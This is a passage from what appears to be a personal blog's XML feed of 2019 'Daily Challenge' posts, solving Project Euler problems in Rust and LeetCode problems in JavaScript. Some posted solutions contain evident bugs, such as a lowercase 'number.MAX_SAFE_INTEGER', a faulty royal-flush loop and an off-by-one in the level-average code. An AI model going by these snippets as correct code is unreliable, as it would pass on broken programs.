target) &#123; for (let i = 0; i &lt; nums.length; ++i) &#123; if (nums[i] === target) return true; &#125; return false;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-12 Daily Challenge]]></title>
    <url>%2F2019-02-12-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Poker hands in Rust and Minimum Moves to Equal Array Elements in JavaScript. MathProblemPoker handsProblem 54In the card game poker, a hand consists of five cards and are ranked, from lowest to highest, in the following way: High Card: Highest value card. One Pair: Two cards of the same value. Two Pairs: Two different pairs. Three of a Kind: Three cards of the same value. Straight: All cards are consecutive values. Flush: All cards of the same suit. Full House: Three of a kind and a pair. Four of a Kind: Four cards of the same value. Straight Flush: All cards are consecutive values of same suit. Royal Flush: Ten, Jack, Queen, King, Ace, in same suit. The cards are valued in the order:2, 3, 4, 5, 6, 7, 8, 9, 10, Jack, Queen, King, Ace. If two players have the same ranked hands then the rank made up of the highest value wins; for example, a pair of eights beats a pair of fives (see example 1 below). But if two ranks tie, for example, both players have a pair of queens, then highest cards in each hand are compared (see example 4 below); if the highest cards tie then the next highest cards are compared, and so on. Consider the following five hands dealt to two players: Hand Player 1 Player 2 Winner 1 5H 5C 6S 7S KD Pair of Fives 2C 3S 8S 8D TD Pair of Eights Player 2 2 5D 8C 9S JS AC Highest card Ace 2C 5C 7D 8S QH Highest card Queen Player 1 3 2D 9C AS AH AC Three Aces 3D 6D 7D TD QD Flush with Diamonds Player 2 4 4D 6S 9H QH QC Pair of Queens Highest card Nine 3D 6D 7H QD QS Pair of Queens Highest card Seven Player 1 5 2H 2D 4C 4D 4S Full House With Three Fours 3C 3D 3S 9S 9D Full House with Three Threes Player 1 The file, poker.txt, contains one-thousand random hands dealt to two players. Each line of the file contains ten cards (separated by a single space): the first five are Player 1&#39;s cards and the last five are Player 2&#39;s cards. You can assume that all hands are valid (no invalid characters or repeated cards), each player&#39;s hand is in no specific order, and in each hand there is a clear winner. How many hands does Player 1 win? SolutionBig simulation...... There must be more graceful implementation, but I&#39;m so poor at Rust... Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219use std::io;fn main() &#123; let reader = io::stdin(); let mut line = String::new(); let mut card1: [(i32, i32); 5] = [(0, 0); 5]; let mut card2: [(i32, i32); 5] = [(0, 0); 5]; let mut rank1: [i32; 6] = [0; 6]; let mut rank2: [i32; 6] = [0; 6]; let mut ans = 0; // let mut cnt = 0; loop &#123; match reader.read_line(&amp;mut line) &#123; Ok(l) =&gt; &#123; if l == 0 &#123; break; &#125; else &#123; (); &#125; &#125; Err(_) =&gt; break, &#125; let mut iter = line.split_whitespace(); for i in 0..5 &#123; card1[i] = get_card(&amp;iter.next().unwrap()); &#125; for i in 0..5 &#123; card2[i] = get_card(&amp;iter.next().unwrap()); &#125; // print!("&#123;&#125;", line); // println!("&#123;:?&#125;", card1); // println!("&#123;:?&#125;", card2); get_rank(&amp;mut rank1, &amp;card1); get_rank(&amp;mut rank2, &amp;card2); // println!("&#123;:?&#125;", rank1); // println!("&#123;:?&#125;", rank2); if compare_rank(&amp;rank1, &amp;rank2) &#123; // println!("Test &#123;&#125;: Player 1", cnt); ans += 1; &#125; else &#123; // println!("Test &#123;&#125;: Player 2", cnt); &#125; // cnt += 1; // println!("&#123;&#125;", ans); line.clear(); &#125; println!("Answer is &#123;&#125;", ans);&#125;fn get_card(s: &amp;str) -&gt; (i32, i32) &#123; let mut s = s.chars(); let number = get_number(s.next().unwrap()); let suit = get_suit(s.next().unwrap()); (number, suit)&#125;fn get_number(c: char) -&gt; i32 &#123; match c &#123; '2' =&gt; return 2, '3' =&gt; return 3, '4' =&gt; return 4, '5' =&gt; return 5, '6' =&gt; return 6, '7' =&gt; return 7, '8' =&gt; return 8, '9' =&gt; return 9, 'T' =&gt; return 10, 'J' =&gt; return 11, 'Q' =&gt; return 12, 'K' =&gt; return 13, 'A' =&gt; return 14, _ =&gt; panic!("Unknown value &#123;:?&#125;", c), &#125;&#125;fn get_suit(c: char) -&gt; i32 &#123; match c &#123; 'S' =&gt; return 0, 'D' =&gt; return 1, 'C' =&gt; return 2, 'H' =&gt; return 3, _ =&gt; panic!("Unknown value &#123;:?&#125;", c), &#125;&#125;fn get_rank(rank: &amp;mut [i32; 6], card: &amp;[(i32, i32); 5]) &#123; let mut suits: [i32; 4] = [0; 4]; let mut numbers: [i32; 15] = [0; 15]; for (number, suit) in card.iter() &#123; suits[*suit as usize] += 1; numbers[*number as usize] += 1; &#125; if suits[0] == 5 || suits[1] == 5 || suits[2] == 5 || suits[3] == 5 &#123; let mut is_ok = true; for i in 10..15 &#123; is_ok = numbers[i] == 1; &#125; if is_ok &#123; rank[0] = 10; return; &#125; is_ok = true; for i in 2..10 &#123; if numbers[i] == 1 &#123; for j in 1..5 &#123; is_ok = is_ok &amp;&amp; numbers[i + j] == 1; &#125; &#125; &#125; let mut cnt = 1; for i in (2..10).rev() &#123; if numbers[i] == 1 &#123; rank[cnt] = i as i32; cnt += 1; &#125; &#125; rank[0] = if is_ok &#123; 9 &#125; else &#123; 6 &#125;; return; &#125; for i in 2..15 &#123; if numbers[i] == 4 &#123; rank[0] = 8; rank[1] = i as i32; return; &#125; &#125; for i in 2..15 &#123; if numbers[i] == 3 &#123; let mut is_ok = false; for j in 2..15 &#123; if numbers[j] == 2 &#123; is_ok = true; &#125; &#125; rank[0] = if is_ok &#123; 7 &#125; else &#123; 4 &#125;; rank[1] = i as i32; return; &#125; &#125; for i in 2..15 &#123; if numbers[i] == 2 &#123; for j in i + 1..15 &#123; if numbers[j] == 2 &#123; rank[1] = j as i32; rank[2] = i as i32; rank[0] = 3; for k in 2..15 &#123; if numbers[k] == 1 &#123; rank[3] = k as i32; &#125; &#125; return; &#125; &#125; let mut cnt = 2; for j in (2..15).rev() &#123; if numbers[j] == 1 &#123; rank[cnt] = j as i32; cnt += 1; &#125; &#125; rank[0] = 2; rank[1] = i as i32; return; &#125; &#125; let mut is_ok = true; for i in 2..10 &#123; if numbers[i] == 1 &#123; for j in 1..5 &#123; is_ok = is_ok &amp;&amp; numbers[i + j] == 1; &#125; if is_ok &#123; break; &#125; &#125; &#125; rank[0] = if is_ok &#123; 5 &#125; else &#123; 1 &#125;; let mut cnt = 1; for i in (2..15).rev() &#123; if numbers[i] == 1 &#123; rank[cnt] = i as i32; cnt += 1; &#125; &#125;&#125;fn compare_rank(rank1: &amp;[i32; 6], rank2: &amp;[i32; 6]) -&gt; bool &#123; if rank1[0] != rank2[0] &#123; return rank1[0] &gt; rank2[0]; &#125; match rank1[0] &#123; 9 | 8 | 7 | 5 | 4 =&gt; return rank1[1] &gt; rank2[1], _ =&gt; (), &#125; if rank1[0] == 6 || rank1[0] == 1 &#123; let mut cnt = 1; while cnt &lt; 6 &amp;&amp; rank1[cnt] == rank2[cnt] &#123; cnt += 1; &#125; return if cnt == 6 &#123; false &#125; else &#123; rank1[cnt] &gt; rank2[cnt]&#125;; &#125; if rank1[0] == 3 &#123; let mut cnt = 1; while cnt &lt; 4 &amp;&amp; rank1[cnt] == rank2[cnt] &#123; cnt += 1; &#125; return if cnt == 4 &#123; false &#125; else &#123; rank1[cnt] &gt; rank2[cnt]&#125;; &#125; if rank1[0] == 2 &#123; let mut cnt = 1; while cnt &lt; 5 &amp;&amp; rank1[cnt] == rank2[cnt] &#123; cnt += 1; &#125; return if cnt == 5 &#123; false &#125; else &#123; rank1[cnt] &gt; rank2[cnt]&#125;; &#125; false&#125; AlgorithmProblem453. Minimum Moves to Equal Array ElementsGiven a non-empty integer array of size n, find the minimum number of moves required to make all array elements equal, where a move is incrementing n - 1 elements by 1. Example: 12345678910Input:[1,2,3]Output:3Explanation:Only three moves are needed (remember each move increments two elements):[1,2,3] =&gt; [2,3,3] =&gt; [3,4,3] =&gt; [4,4,4] SolutionIncrement other n-1 element means decrement one element. Implementation12345678910111213/** * @param &#123;number[]&#125; nums * @return &#123;number&#125; */var minMoves = function(nums) &#123; let min = number.MAX_SAFE_INTEGER; let sum = 0; for (const num of nums) &#123; min = min&lt;num?min:num; sum += num; &#125; return sum-min*nums.length;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-11 Daily Challenge]]></title>
    <url>%2F2019-02-11-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Combinatoric selections in Rust and Search in Rotated Sorted Array in JavaScript. MathProblemCombinatoric selectionsProblem 53There are exactly ten ways of selecting three from five, 12345: 123, 124, 125, 134, 135, 145, 234, 235, 245, and 345 In combinatorics, we use the notation, $C^5_3​$ = 10. In general,$C^n_r=\frac{n!}{r!(n-r)!},where r ≤ n, n! = n×(n−1)×...×3×2×1, and\ 0! = 1​$ It is not until n = 23, that a value exceeds one-million: $C^{23}_{10}$ = 1144066. How many, not necessarily distinct, values of $C^n_r$, for 1 ≤ n ≤ 100, are greater than one-million? SolutionBy definition you could find that $C^n_r=C^n_{(n-r)}$, and more, $C_r^n\ meet\ its\ maximum\ when\ r=n/2$. Implementation12345678910111213141516fn main() &#123; let mut ans = 0; for i in 2..101 &#123; let mut tmp = 1; for j in 1..i/2 &#123; tmp *= i-j+1; tmp /= j; if tmp &gt; 1_000_000 &#123; println!("C(&#123;&#125;, &#123;&#125;)", i, j); ans += i-j-j+1; break; &#125; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem33. Search in Rotated Sorted ArraySuppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand. (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]). You are given a target value to search. If found in the array return its index, otherwise return -1. You may assume no duplicate exists in the array. Your algorithm&#39;s runtime complexity must be in the order of O(log n). Example 1: 12Input: nums = [4,5,6,7,0,1,2], target = 0Output: 4 Example 2: 12Input: nums = [4,5,6,7,0,1,2], target = 3Output: -1 SolutionAll you need to do is use what we done at the day before yesterday to find pivot, and add it into normal binary search. Implementation12345678910111213141516171819202122232425262728/** * @param &#123;number[]&#125; nums * @param &#123;number&#125; target * @return &#123;number&#125; */var search = function(nums, target) &#123; let begin = 0; let end = nums.length - 1; let mid; while (nums[begin] &gt; nums[end]) &#123; mid = Math.floor((begin + end) / 2); if (nums[mid] &gt;= nums[begin]) &#123; begin = mid + 1; &#125; else &#123; end = mid; &#125; &#125; let pivot = begin; begin = 0; end = nums.length; // console.log(begin, end); while (begin &lt; end) &#123; mid = (Math.floor((begin + end) / 2)); if (nums[(mid+pivot)%nums.length] &lt; target) begin = mid + 1; else end = mid; &#125; return nums[(begin+pivot)%nums.length]===target?(begin+pivot)%nums.length:-1; &#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-10 Daily Challenge]]></title>
    <url>%2F2019-02-10-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Permuted multiples in Rust and Find Minimum in Rotated Sorted Array II in JavaScript. MathProblemPermuted multiplesProblem 52It can be seen that the number, 125874, and its double, 251748, contain exactly the same digits, but in a different order. Find the smallest positive integer, x, such that 2x, 3x, 4x, 5x, and 6x, contain the same digits. SolutionI&#39;ve tried to find some graceful solution which need no stack-based array to determine if two numbers are permutation of each other, and get nothing. So just brute force. Implementation1234567891011121314151617181920212223242526272829303132333435363738394041fn main() &#123; let mut down_bound = 100; let mut up_bound = 1000/6 + 1; let mut found: bool = false; let mut ans = 0; while !found &#123; for i in down_bound..up_bound &#123; let mut is_ok = true; for j in 2..7 &#123; if !is_permutation(i, i*j) &#123; is_ok = false; break; &#125; &#125; if is_ok &#123; ans = i; found = true; &#125; &#125; down_bound *= 10; up_bound = down_bound*10/6 + 1; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn is_permutation(mut u: usize, mut v: usize) -&gt; bool &#123; let mut a1: [usize; 10] = [0; 10]; let mut a2: [usize; 10] = [0; 10]; while u &gt; 0 &#123; a1[u%10] += 1; a2[v%10] += 1; u /= 10; v /= 10; &#125; for i in 0..10 &#123; if a1[i] != a2[i] &#123; return false; &#125; &#125; true&#125; AlgorithmProblem154. Find Minimum in Rotated Sorted Array IISuppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand. (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]). Find the minimum element. The array may contain duplicates. Example 1: 12Input: [1,3,5]Output: 1 Example 2: 12Input: [2,2,2,0,1]Output: 0 Note: This is a follow up problem to Find Minimum in Rotated Sorted Array. Would allow duplicates affect the run-time complexity? How and why? SolutionI guess worst case of time complexity of algorithms will be $O(N)$, because we can&#39;t use binary partition to deal with duplicates. Implementation1234567891011/** * @param &#123;number[]&#125; nums * @return &#123;number&#125; */var findMin = function(nums) &#123; if (nums[0] &lt; nums[nums.length-1]) return nums[0]; for (const val of nums) &#123; if (val &lt; nums[0]) return val; &#125; return nums[0];&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-09 Daily Challenge]]></title>
    <url>%2F2019-02-09-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Prime digit replacements in Rust and Find Minimum in Rotated Sorted Array in JavaScript. MathProblemPrime digit replacementsProblem 51By replacing the 1st digit of the 2-digit number *3, it turns out that six of the nine possible values: 13, 23, 43, 53, 73, and 83, are all prime. By replacing the 3rd and 4th digits of 56**3 with the same digit, this 5-digit number is the first example having seven primes among the ten generated numbers, yielding the family: 56003, 56113, 56333, 56443, 56663, 56773, and 56993. Consequently 56003, being the first member of this family, is the smallest prime with this property. Find the smallest prime which, by replacing part of the number (not necessarily adjacent digits) with the same digit, is part of an eight prime value family. SolutionI&#39;ve read description several times and realize it&#39;s a very interesting problem. First you need to find prime match the patter &quot;have 3 digit with same value&quot;, why is 3? Actually it will be any number that is multiple of 3. There is a little trick we learn at junior school: every number which can be divide by 3, the sum of their digits can be divide by 3, and vice versa. Second there is a trick to find set $S$&#39;s(of size $n$) subset $R$ which is of size $r$: 12345for (int s = (1&lt;&lt;r)-1; s&lt;(1&lt;&lt;n); ) &#123; int x = s&amp;-s; int y = s+x; s = ((s&amp;-y)/x&gt;&gt;1) | y;&#125; Here&#39;s my idea: There is still something I can do to improve program&#39;s performance. But just leave it XD Implementation1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192extern crate primal;use primal::Sieve;fn main() &#123; let sieve: Sieve = Sieve::new(1_000_000_000); let mut up_bound: usize = 99_999; let mut down_bound: usize = 10_000; let mut size: usize = 5; let mut pattern: isize = -1; let mut found: bool = false; let mut ans: usize = 0; while !found &#123; let up_bd = sieve.prime_pi(up_bound) + 1; let dw_bd = sieve.prime_pi(down_bound) + 1; // println!("&#123;&#125;", up_bound); for i in dw_bd..up_bd &#123; let p = sieve.nth_prime(i); if !match_pattern(p, &amp;mut pattern, size) &#123; continue; &#125; // println!("&#123;&#125;, &#123;:b&#125;", p, pattern); if count(p, pattern, size, &amp;sieve) == 8 &#123; ans = p; found = true; break; &#125; &#125; up_bound = up_bound * 10 + 9; down_bound *= 10; size += 1; &#125; println!("Answer is &#123;&#125;", ans)&#125;fn match_pattern(p: usize, pattern: &amp;mut isize, size: usize) -&gt; bool &#123; let mut s: isize = (1 &lt;&lt; 3) - 1; while s &lt; (1 &lt;&lt; size) &#123; let mut num = 99; let mut cnt = 0; let mut tmp_mask = s; let mut tmp_p = p; while tmp_mask != 0 &#123; if tmp_mask &amp; 1 == 1 &#123; if num == 99 || num == tmp_p%10 &#123; num = tmp_p % 10; cnt += 1; &#125; else if num != tmp_p % 10 &#123; cnt = -1; break; &#125; &#125; tmp_mask &gt;&gt;= 1; tmp_p /= 10; &#125; if cnt == 3 &amp;&amp; num &lt; 3 &#123; *pattern = s; return true; &#125; let x = s &amp; -s; let y = s + x; s = ((s &amp; !y) / x &gt;&gt; 1) | y; &#125; return false;&#125;fn count(p: usize, pattern: isize, size: usize, sieve: &amp;Sieve) -&gt; usize &#123; let mut cnt: usize = 0; let dw_bd = if (pattern &lt;&lt; 1) &gt; (1 &lt;&lt; size) &#123; 1 &#125; else &#123; 0 &#125;; for i in dw_bd..10 &#123; let mut size = size; let mut num = 0; let mut tmp_mask = pattern; let mut tmp_p = p; let mut bcnt = 0; while size != 0 &#123; if tmp_mask &amp; 1 == 1 &#123; num += i * 10usize.pow(bcnt); &#125; else &#123; num += tmp_p % 10 * 10usize.pow(bcnt); &#125; tmp_mask &gt;&gt;= 1; tmp_p /= 10; bcnt += 1; size -= 1; &#125; if sieve.is_prime(num) &#123; cnt += 1 &#125; &#125; return cnt;&#125; AlgorithmProblem153. Find Minimum in Rotated Sorted ArraySuppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand. (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]). Find the minimum element. You may assume no duplicate exists in the array. Example 1: 12Input: [3,4,5,1,2] Output: 1 Example 2: 12Input: [4,5,6,7,0,1,2]Output: 0 SolutionBinary search. And the solution on the website is not grace. All binary search with two possible return value(left and right) is b**ls**t. Implementationrecursive: 12345678910111213141516171819/** * @param &#123;number[]&#125; nums * @return &#123;number&#125; */var findMin = function(nums) &#123; let findmin = (begin, end) =&gt; &#123; if (nums[begin] &lt;= nums[end]) &#123; return nums[begin]; &#125; else &#123; let mid = Math.floor((begin+end)/2); if (nums[mid] &gt;= nums[begin]) &#123; return findmin(mid+1, end); &#125; else &#123; return findmin(begin, mid); &#125; &#125; &#125;; return findmin(0, nums.length-1);&#125;; non-recursive: 12345678910111213141516/** * @param &#123;number[]&#125; nums * @return &#123;number&#125; */var findMin = function(nums) &#123; let begin = 0, end = nums.length - 1; while (nums[begin] &gt; nums[end]) &#123; let mid = Math.floor((begin + end) / 2); if (nums[mid] &gt;= nums[begin]) &#123; begin = mid + 1; &#125; else &#123; end = mid; &#125; &#125; return nums[begin]; &#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-08 Daily Challenge]]></title>
    <url>%2F2019-02-08-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Self powers in Rust and Summary Ranges in JavaScript. MathProblemConsecutive prime sumProblem 50The prime 41, can be written as the sum of six consecutive primes: 41 = 2 + 3 + 5 + 7 + 11 + 13 This is the longest sum of consecutive primes that adds to a prime below one-hundred. The longest sum of consecutive primes below one-thousand that adds to a prime, contains 21 terms, and is equal to 953. Which prime, below one-million, can be written as the sum of the most consecutive primes? SolutionBrute force. Implementation123456789101112131415161718192021222324252627extern crate primal;use primal::Sieve;fn main() &#123; const LIMIT: usize = 1_000_000; let sieve: Sieve = Sieve::new(LIMIT); let bound = sieve.prime_pi(LIMIT); let mut ans = 0; let mut cnt = 0; for i in 1..bound &#123; let mut sum = 0; let mut offset = 0; if i + cnt &gt; bound &#123; break &#125; while sum &lt; LIMIT &#123; if offset &gt; cnt &amp;&amp; sieve.is_prime(sum) &#123; ans = sum; cnt = offset; &#125; sum += sieve.nth_prime(i + offset); offset += 1; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem228. Summary RangesGiven a sorted integer array without duplicates, return the summary of its ranges. Example 1: 123Input: [0,1,2,4,5,7]Output: [&quot;0-&gt;2&quot;,&quot;4-&gt;5&quot;,&quot;7&quot;]Explanation: 0,1,2 form a continuous range; 4,5 form a continuous range. Example 2: 123Input: [0,2,3,4,6,8,9]Output: [&quot;0&quot;,&quot;2-&gt;4&quot;,&quot;6&quot;,&quot;8-&gt;9&quot;]Explanation: 2,3,4 form a continuous range; 8,9 form a continuous range. SolutionNothing to say. Implementation123456789101112131415161718192021/** * @param &#123;number[]&#125; nums * @return &#123;string[]&#125; */var summaryRanges = function(nums) &#123; if (nums.length === 0) return []; let ans = []; let begin = nums[0]; let cur = nums[0]; for (let i = 1; i &lt; nums.length; ++i) &#123; if (nums[i] - cur === 1) cur += 1; else &#123; if (cur === begin) ans.push(cur+""); else ans.push(begin+"-&gt;"+cur); begin = cur = nums[i]; &#125; &#125; if (cur === begin) ans.push(cur+""); else ans.push(begin+"-&gt;"+cur); return ans;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-07 Daily Challenge]]></title>
    <url>%2F2019-02-07-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Self powers in Rust and Average of Levels in Binary Tree in JavaScript. MathProblemPrime permutationsProblem 49The arithmetic sequence, 1487, 4817, 8147, in which each of the terms increases by 3330, is unusual in two ways: (i) each of the three terms are prime, and, (ii) each of the 4-digit numbers are permutations of one another. There are no arithmetic sequences made up of three 1-, 2-, or 3-digit primes, exhibiting this property, but there is one other 4-digit increasing sequence. What 12-digit number do you form by concatenating the three terms in this sequence? SolutionI thought there is only (i) and (ii) required, but each of the terms increases by 3330 is required, too...... ImplementationWrong solution 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152extern crate primal;use primal::Sieve;use std::collections::HashMap;use std::string::String;fn main() &#123; let sieve: Sieve = Sieve::new(10000); let up_bound = sieve.prime_pi(10000) + 1; let down_bound = sieve.prime_pi(1000) + 1; let mut map: HashMap&lt;usize, usize&gt; = HashMap::new(); for i in down_bound..up_bound &#123; let tmp = sieve.nth_prime(i); if tmp != 1487 &amp;&amp; tmp != 4817 &amp;&amp; tmp != 8147 &#123; let key = f(tmp); if map.contains_key(&amp;key) &#123; *map.get_mut(&amp;key).unwrap() += 1; &#125; else &#123; map.insert(key, 1); &#125; &#125; &#125; let mut k = 0; let mut ans: String = String::new(); for (key, value) in map &#123; if value == 3 &#123; k = key; &#125; &#125; for i in down_bound..up_bound &#123; let tmp = sieve.nth_prime(i); if f(tmp) == k &#123; ans = format!("&#123;&#125;&#123;&#125;", ans, tmp); &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn f(mut tmp: usize) -&gt; usize &#123; let mut tmp_vec = vec![]; while tmp != 0 &#123; tmp_vec.push(tmp % 10); tmp /= 10; &#125; tmp_vec.sort(); let mut key = 0; for i in tmp_vec &#123; key *= 10; key += i; &#125; key&#125; Right solution: 1234567891011121314151617181920212223242526272829303132333435extern crate primal;use primal::Sieve;use std::string::String;fn main() &#123; let sieve: Sieve = Sieve::new(10000); let up_bound = sieve.prime_pi(3330) + 1; let down_bound = sieve.prime_pi(1000) + 1; let mut ans: String = String::new(); for i in down_bound..up_bound &#123; let tmp = sieve.nth_prime(i); if tmp != 1487 &#123; if f(tmp) == f(tmp+3330) &amp;&amp; sieve.is_prime(tmp+3330) &amp;&amp; f(tmp) == f(tmp+6660) &amp;&amp; sieve.is_prime(tmp+6660) &#123; ans = format!("&#123;&#125;&#123;&#125;&#123;&#125;", tmp, tmp+3330, tmp+6660) &#125; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn f(mut tmp: usize) -&gt; usize &#123; let mut tmp_vec = vec![]; while tmp != 0 &#123; tmp_vec.push(tmp % 10); tmp /= 10; &#125; tmp_vec.sort(); let mut key = 0; for i in tmp_vec &#123; key *= 10; key += i; &#125; key&#125; AlgorithmProblem125. Valid PalindromeGiven a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases. Note: For the purpose of this problem, we define empty string as valid palindrome. Example 1: 12Input: &quot;A man, a plan, a canal: Panama&quot;Output: true Example 2: 12Input: &quot;race a car&quot;Output: false SolutionNothing to say. Implementation1234567891011/** * @param &#123;string&#125; s * @return &#123;boolean&#125; */var isPalindrome = function(s) &#123; s = s.replace(/[^0-9a-zA-Z]/gm, "").toLocaleLowerCase(); return s.split("").reverse().join("") === s;&#125;;// console.log(isPalindrome("A man, a plan, a canal: Panama"));// console.log(isPalindrome("race a car"));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-06 Daily Challenge]]></title>
    <url>%2F2019-02-06-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Self powers in Rust and Average of Levels in Binary Tree in JavaScript. MathProblemSelf powersProblem 48The series, $1^1 + 2^2 + 3^3 + ... + 10^{10} = 10405071317$. Find the last ten digits of the series, $1^1 + 2^2 + 3^3 + ... + 1000^{1000}$. SolutionModular arithmetic has compatibility with addition\multiplication. Be careful, result of middle processing will exceed 2^64. Implementation1234567891011121314151617181920212223fn main() &#123; let mut ans: u128 = 0; const MOD: u128 = 10_000_000_000; for i in 1..1001 &#123; ans += quick_pow(i, i, MOD); ans %= MOD; &#125; println!("Answer is &#123;&#125;", ans);&#125;fn quick_pow(mut b: u128, mut e: u128, m: u128) -&gt; u128 &#123; let mut ans = 1; while e != 0 &#123; if e&amp;1 == 1 &#123; ans *= b; ans %= m; &#125; e &gt;&gt;= 1; b *= b; b %= m; &#125; return ans;&#125; AlgorithmProblem637. Average of Levels in Binary TreeGiven a non-empty binary tree, return the average value of the nodes on each level in the form of an array. Example 1: 123456789Input: 3 / \ 9 20 / \ 15 7Output: [3, 14.5, 11]Explanation:The average value of nodes on level 0 is 3, on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11]. Note: The range of node&#39;s value is in the range of 32-bit signed integer. SolutionSimple BFS/DFS. I&#39;ve write a non-FP implementation and an implementation with a little FP :D Implementationnon-FP 12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number[]&#125; */var averageOfLevels = function(root) &#123; let queue = []; let ans = []; let cnt = []; queue.push([0, root]); while (queue.length) &#123; let cur = queue.shift(); if (cur[1] === null) continue; if (ans.length &lt;= cur[0]) ans.push(cur[1].val); else ans[cur[0]] += cur[1].val; if (cnt.length &lt;= cur[0]) cnt.push(1); else cnt[cur[0]] += 1; queue.push([cur[0]+1, cur[1].left]); queue.push([cur[0]+1, cur[1].right]); &#125; for (const [index, value] of ans.entries()) &#123; ans[index] = value/cnt[index]; &#125; return ans;&#125;; A little FP 1234567891011121314151617181920212223242526272829/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @return &#123;number[]&#125; */var averageOfLevels = function(root) &#123; let queue = []; let ans = []; queue.push([0, root]); while (queue.length) &#123; let cur = queue.shift(); if (cur[1] === null) continue; if (ans.length &lt; cur[0]) &#123; ans.push(&#123;cnt : 1, sum : cur[1].val&#125;); &#125; else &#123; ans[cur[0]].cnt += 1; ans[cur[0]].sum += cur[1].val; &#125; queue.push([cur[0]+1, cur[1].left]); queue.push([cur[0]+1, cur[1].right]); &#125; return ans.map(val =&gt; val.sum/val.cnt);&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-02-05 Daily Challenge]]></title>
    <url>%2F2019-02-05-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[Happy new year!~ What I&#39;ve done today is Distinct primes factors in Rust and Longest Univalue Path in JavaScript. MathProblemDistinct primes factorsProblem 47The first two consecutive numbers to have two distinct prime factors are: 14 = 2 × 715 = 3 × 5 The first three consecutive numbers to have three distinct prime factors are: 644 = 2² × 7 × 23645 = 3 × 5 × 43646 = 2 × 17 × 19. Find the first four consecutive integers to have four distinct prime factors each. What is the first of these numbers? SolutionNothing to say. Implementation1234567891011121314151617181920212223242526272829extern crate primal;use primal::Sieve;fn main() &#123; let sieve: Sieve = Sieve::new(10000); let mut found = false; let mut cur: usize = 2; let mut ans: usize = 0; while !found &#123; while sieve.factor(cur).unwrap().len() != 4 &#123; cur += 1; &#125; let mut tmp = true; for _i in 0..3 &#123; cur += 1; if sieve.factor(cur).unwrap().len() != 4 &#123; tmp = false; break; &#125; &#125; if tmp == true &#123; ans = cur - 3; found = true; &#125; cur += 1; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem687. Longest Univalue PathGiven a binary tree, find the length of the longest path where each node in the path has the same value. This path may or may not pass through the root. Note: The length of path between two nodes is represented by the number of edges between them. Example 1: Input: 12345 5 / \ 4 5 / \ \1 1 5 Output: 12 